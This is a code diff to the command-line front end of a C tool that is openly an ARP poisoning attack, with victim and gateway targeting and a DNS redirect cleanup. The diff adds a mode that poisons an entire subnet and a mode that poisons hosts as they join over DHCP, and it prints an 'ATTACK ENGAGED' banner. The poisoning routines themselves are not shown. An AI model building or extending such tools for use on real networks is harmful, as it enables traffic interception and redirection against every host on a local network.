@@ -47,8 +47,10 @@ int main(int argc, char *argv[]) {
 
   char *victim_ip_str = NULL;
   char *gateway_ip_str = NULL;
+  int wide_mode = 0;
+  int smart_mode = 0;
   int opt;
-  while ((opt = getopt(argc, argv, "t:g:h")) != -1) {
+  while ((opt = getopt(argc, argv, "t:g:wsh")) != -1) {
     switch (opt) {
     case 't':
       victim_ip_str = optarg;
@@ -56,12 +58,20 @@ int main(int argc, char *argv[]) {
     case 'g':
       gateway_ip_str = optarg;
       break;
+    case 'w':
+      wide_mode = 1;
+      break;
+    case 's':
+      smart_mode = 1;
+      break;
     case 'h':
     default:
-      fprintf(stderr, "Usage: %s [-t <victim_ip>] [-g <gateway_ip>]\n",
+      fprintf(stderr, "Usage: %s [-t <victim_ip>] [-g <gateway_ip>] [-w] [-s]\n",
               argv[0]);
-      fprintf(stderr, "If -t is omitted, scans network for all victims.\n");
-      fprintf(stderr, "If -g is omitted, auto-discovers default gateway.\n");
+      fprintf(stderr, "  -t <ip>  Target a specific victim IP.\n");
+      fprintf(stderr, "  -g <ip>  Override default gateway IP.\n");
+      fprintf(stderr, "  -w       Subnet-Wide Brute Force mode (poisons entire range).\n");
+      fprintf(stderr, "  -s       Smart DHCP mode (poisons on new connections).\n");
       exit(EXIT_FAILURE);
     }
   }
@@ -131,9 +141,8 @@ int main(int argc, char *argv[]) {
     memcpy(g_victims[0].mac, v_mac_alloc, 6);
     free(v_mac_alloc);
     g_victim_count = 1;
-    printf("[*] Discovered Victim MAC:   ");
-    print_hex_mac(g_victims[0].mac);
-  } else {
+    printf("[+] Found %d victims on the network.\n", g_victim_count);
+  } else if (!wide_mode && !smart_mode) {
     printf("[*] Discovering network victims...\n");
     g_victims = scan_network(g_gateway_ip, &g_victim_count);
     if (!g_victims || g_victim_count == 0 || g_victim_count > 512) {
@@ -157,7 +166,14 @@ int main(int argc, char *argv[]) {
   // Launch Loop
   printf("\n[*] >>> ATTACK ENGAGED : ARP poisoning Engine active! <<<\n");
   printf("[*] (Press Ctrl+C to cleanly heal the network and exit)\n\n");
-  start_poisoning(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
+
+  if (wide_mode) {
+    start_wide_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
+  } else if (smart_mode) {
+    start_smart_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
+  } else {
+    start_poisoning(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
+  }
   // Only reached if start_poisoning exits
   cleanup_dns_redirect();
   if (g_victims)
